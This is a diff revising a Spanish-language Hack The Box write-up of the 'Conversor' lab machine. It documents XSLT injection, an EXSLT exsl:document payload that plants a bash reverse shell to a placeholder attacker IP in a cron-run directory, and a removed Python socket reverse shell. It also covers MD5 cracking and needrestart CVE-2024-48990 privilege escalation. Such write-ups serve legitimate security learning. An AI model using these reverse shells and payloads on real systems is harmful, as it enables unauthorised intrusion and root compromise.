@@ -2,10 +2,10 @@
 title: "HTB Conversor - Write-Up"
 date: 2026-11-23
 categories: [Hack The Box]
-tags: [xslt-injection, lxml, path-traversal, arbitrary-file-write, md5-cracking, cve-2024-48990, needrestart-privesc]
+tags: [xslt-injection, lxml, exslt, cron-abuse, md5-cracking, cve-2024-48990, needrestart-privesc]
 ---
 
-Write-up de **Conversor**, máquina Linux de Hack The Box. El camino: varios callejones sin salida en una inyección XSLT (XXE, SSRF, RCE vía extensión Python), la vulnerabilidad real en forma de Path Traversal en la subida de archivos que permite escritura arbitraria, RCE sobrescribiendo el `.wsgi` de la app, un hash MD5 filtrado en la base de datos SQLite, y escalada final a root abusando de **CVE-2024-48990** en `needrestart`.
+Write-up de **Conversor**, máquina Linux de Hack The Box. El camino: varios callejones sin salida en una inyección XSLT (XXE, SSRF, RCE vía extensión Python no registrada), el vector real de RCE usando la extensión estándar EXSLT `exsl:document` para dejar caer un script en un directorio vigilado por cron, un hash MD5 filtrado en la base de datos SQLite, y escalada final a root abusando de **CVE-2024-48990** en `needrestart`.
 
 ## Fase 1 — Reconocimiento
 
@@ -14,10 +14,11 @@ nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -T4 10.129.238.31 -oG allPorts
 nmap -sVC -p22,80 -oN targeted 10.129.238.31
 ```
 
-- **22**: OpenSSH.
+- **22**: OpenSSH 8.9p1 Ubuntu.
 - **80**: Apache 2.4.52 (Ubuntu), redirige al vhost `conversor.htb` (añadir a `/etc/hosts`).
+- Sistema: Ubuntu 22.04 LTS.
 
-La web es una página de login con `/register` abierto. Tras registrarse y entrar, el panel ofrece una funcionalidad de conversión: subir un `xml_file` y un `xslt_file` a `/convert`, que el backend transforma con un procesador XSLT y devuelve el resultado en `/view/<id>`.
+Un `gobuster`/`feroxbuster` contra el vhost descubre `/about`, `/login`, `/register`, `/convert` (405, solo acepta `POST`) y `/server-status` (403). La web es una página de login con `/register` abierto. Tras registrarse y entrar, el panel ofrece una funcionalidad de conversión: subir un `xml_file` y un `xslt_file` a `/convert`, que el backend los transforma con `lxml`/`libxslt` y sirve el resultado en `/view/<id>`.
 
 ## Fase 2 — Inyección XSLT: varios caminos descartados
 
@@ -37,9 +38,9 @@ Subir un XSLT propio permite controlar la transformación — candidato claro a 
 
 El fichero `nmap.xslt` que el propio sitio ofrece como plantilla de ejemplo (en `/static/nmap.xslt`) sirve para entender el formato esperado por el conversor, pero no aporta una vía de explotación por sí solo.
 
-## Fase 3 — Descarga del código fuente y Path Traversal en la subida
+## Fase 3 — Descarga del código fuente
 
-Buscando directorios/backups expuestos aparece un `source_code.tar.gz` descargable. Al extraerlo:
+El `/about` enlaza a un `source_code.tar.gz` descargable. Al extraerlo:
 
 ```bash
 file source_code.tar.gz
@@ -47,45 +48,53 @@ file source_code.tar.gz
 tar -xvf source_code.tar.gz   # sin la flag -z
 ```
 
-Dentro, `app.py` revela el fallo real:
+Puntos clave de `app.py`:
 
-```python
-xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
-xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
+- `app.secret_key = 'Changemeplease'` hardcodeada.
+- `xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)` sin ningún `secure_filename()` — **Path Traversal en el nombre de fichero** al subir (confirmable escribiendo un `filename` con ruta absoluta, ya que `os.path.join('/a', '/b/c')` devuelve `/b/c`).
+- El parser `lxml` se inicializa con `resolve_entities=False, no_network=True, load_dtd=False` — bloquea XXE/SSRF de forma explícita.
+- `install.md` describe un cron que corre cada minuto como `www-data`:
+
+```
+* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
 ```
 
-Sin ningún `secure_filename()`. El nombre del archivo subido se usa tal cual para construir la ruta de guardado — **Path Traversal en el nombre de fichero**. Y como `os.path.join('/a', '/b/c')` devuelve `/b/c` (ignora el primer argumento cuando el segundo es una ruta absoluta), basta con subir el archivo con un `filename` absoluto para escribir en cualquier ruta donde el proceso de Apache (`www-data`) tenga permiso:
+> **Descartado — secreto de sesión Flask hardcodeado:** firmar una cookie con `flask-unsign --sign --cookie "{'user_id': 1}" --secret 'Changemeplease'` falla contra el servidor real (redirige a `/login`): el secreto en producción es distinto del valor de la plantilla filtrada.
+
+## Fase 4 — RCE real: `exsl:document` + cron sobre `scripts/`
+
+El intento inicial de usar el Path Traversal de la subida para sobrescribir ficheros de la app (plantillas Jinja2, `app.wsgi`) resulta innecesariamente arriesgado y no hace falta: `libxslt` soporta de forma nativa la extensión estándar **EXSLT** `exsl:document`, que permite escribir el resultado de la transformación directamente en una ruta del sistema de archivos — sin necesidad de ningún `py:eval` ni extensión Python registrada.
+
+Combinando eso con el cron ya detectado (ejecuta cualquier `.py` dentro de `scripts/` cada minuto como `www-data`), basta con escribir el payload ahí dentro:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0"
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+    xmlns:exsl="http://exslt.org/common"
+    extension-element-prefixes="exsl">
+  <xsl:template match="/">
+    <exsl:document href="/var/www/conversor.htb/scripts/pwn.py" method="text">
+      <xsl:text>
+import os
+os.system("/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/IP_ATACANTE/443 0&gt;&amp;1'")
+      </xsl:text>
+    </exsl:document>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+(Los caracteres `>` y `&` del payload bash van escapados como entidades XML — `&gt;` y `&amp;` — para que el XSLT siga siendo XML válido.)
 
 ```bash
+nc -lvnp 443
 curl -i -b "session=TU_COOKIE" \
-  -F 'xml_file=@pwn.html;filename=/var/www/conversor.htb/uploads/pwn.html' \
-  -F 'xslt_file=@test.xslt' \
+  -F 'xml_file=@test.xml;type=application/xml' \
+  -F 'xslt_file=@evil.xslt;type=application/xslt+xml' \
   http://conversor.htb/convert
 ```
 
-Visitar `http://conversor.htb/uploads/pwn.html` confirma la escritura arbitraria.
-
-> **Descartado — secreto de sesión Flask hardcodeado:** el código fuente trae `app.secret_key = 'Changemeplease'`. Firmar una cookie con `flask-unsign --sign --cookie "{'user_id': 1}" --secret 'Changemeplease'` falla contra el servidor real (redirige a `/login`): el secreto en producción es distinto del valor de la plantilla filtrada.
-
-## Fase 4 — RCE sobrescribiendo `app.wsgi`
-
-Con escritura arbitraria confirmada, el objetivo es sobrescribir un archivo que Apache/`mod_wsgi` ejecute. `app.wsgi` pertenece a `www-data` y es el punto de entrada que carga `mod_wsgi`:
-
-```python
-import socket,subprocess,os
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("IP_ATACANTE",4444))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-subprocess.call(["/bin/sh","-i"])
-```
-
-Subido vía el mismo Path Traversal (`filename=/var/www/conversor.htb/app.wsgi`), con un listener esperando:
-
-```bash
-nc -lvnp 4444
-```
+En menos de un minuto, el cron recoge `pwn.py` y lo ejecuta:
 
 ```
 $ id
@@ -116,7 +125,7 @@ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 Keepmesafeandwarm
 ```
 
-> **Descartado:** el cron `* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done` que limpia `uploads/` corre como `www-data` — el mismo usuario ya obtenido, así que no aporta escalada.
+> **Nota:** el mismo cron que dio el RCE (`scripts/*.py` cada minuto) corre como `www-data`, el mismo usuario que ya se tiene, así que no sirve para escalar más allá — hay que buscar la credencial en otro sitio.
 
 ```bash
 ssh fismathack@10.129.238.31
@@ -140,7 +149,7 @@ User fismathack may run the following commands on conversor:
     (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
 ```
 
-La versión instalada de `needrestart` es vulnerable a **CVE-2024-48990**: al ejecutarse como root, escanea los procesos Python en marcha y hereda su `PYTHONPATH`. Si ese `PYTHONPATH` apunta a un directorio controlado por el atacante que contiene un módulo `importlib/__init__.so` (no un `.py` — tiene que ser una librería compilada, el primer intento con un `.py` falla sin error claro), `needrestart` termina cargando ese `.so` malicioso con privilegios de root.
+La versión instalada, `needrestart 3.5`, es vulnerable a **CVE-2024-48990**: al ejecutarse como root, escanea los procesos Python en marcha y hereda su `PYTHONPATH`. Si ese `PYTHONPATH` apunta a un directorio controlado por el atacante que contiene un módulo `importlib/__init__.so` (no un `.py` — tiene que ser una librería compilada, el primer intento con un `.py` falla sin error claro), `needrestart` termina cargando ese `.so` malicioso con privilegios de root.
 
 Requisitos para disparar la carga: un proceso Python "señuelo" vivo en el momento del escaneo, importando activamente `importlib` en bucle (un simple `time.sleep()` no es suficiente, porque `needrestart` necesita ver la importación real para decidir recargar ese proceso).
 
@@ -193,4 +202,4 @@ cat /root/root.txt
 
 ## Conclusión
 
-Conversor combina un punto de entrada web poco convencional (inyección XSLT) que resulta ser casi todo ruido — document() capado, sin extensiones Python registradas, secreto de Flask no explotable — con la vulnerabilidad real escondida al lado: un simple Path Traversal en el nombre de archivo de una subida, sin `secure_filename()`. De ahí, escritura arbitraria → RCE sobrescribiendo el `.wsgi` → credenciales filtradas en una base de datos SQLite local → una CVE reciente de Linux (`needrestart`) para rematar con root.
+Conversor combina un punto de entrada web poco convencional (inyección XSLT) con varios callejones sin salida — `document()` capado, sin extensiones Python registradas, secreto de Flask no explotable, Path Traversal en la subida que no hace falta usar — y la vía real: una extensión EXSLT estándar (`exsl:document`) que escribe en disco sin necesidad de ningún RCE de Python, combinada con un cron ya expuesto en el código fuente. De ahí, credenciales filtradas en una base de datos SQLite local → una CVE reciente de Linux (`needrestart`) para rematar con root.
